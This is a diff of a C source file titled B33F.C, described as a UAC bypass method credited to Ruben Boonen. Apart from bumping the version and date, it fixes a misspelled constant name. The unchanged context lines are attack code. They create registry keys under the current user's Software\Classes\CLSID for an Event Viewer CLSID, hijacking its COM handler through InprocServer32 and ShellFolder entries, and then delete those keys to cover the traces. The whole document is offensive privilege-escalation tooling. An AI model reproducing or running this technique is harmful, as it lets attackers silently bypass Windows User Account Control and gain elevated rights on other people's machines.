@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017
+*  (C) COPYRIGHT AUTHORS, 2017 - 2018
 *
 *  TITLE:       B33F.C
 *
-*  VERSION:     2.85
+*  VERSION:     2.87
 *
-*  DATE:        01 Dec 2017
+*  DATE:        18 Jan 2018
 *
 *  UAC bypass method from Ruben Boonen aka b33f.
 *
@@ -58,7 +58,7 @@ BOOL ucmMethodCOMHandlers(
         //
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_INPROCSERVER32);
 
         hKey = NULL;
@@ -110,7 +110,7 @@ BOOL ucmMethodCOMHandlers(
         //
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_SHELLFOLDER);
         hKey = NULL;
         lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szRegBuffer, 0, NULL,
@@ -169,19 +169,19 @@ BOOL ucmMethodCOMHandlers(
     if (bResult) {
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_SHELLFOLDER);
         RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
 
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         _strcat(szRegBuffer, T_REG_INPROCSERVER32);
         RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
 
         RtlSecureZeroMemory(&szRegBuffer, sizeof(szRegBuffer));
         _strcpy(szRegBuffer, T_REG_SOFTWARECLASSESCLSID);
-        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASSS);
+        _strcat(szRegBuffer, T_CLSID_EVENTVWR_BYPASS);
         RegDeleteKey(HKEY_CURRENT_USER, szRegBuffer);
     }
 
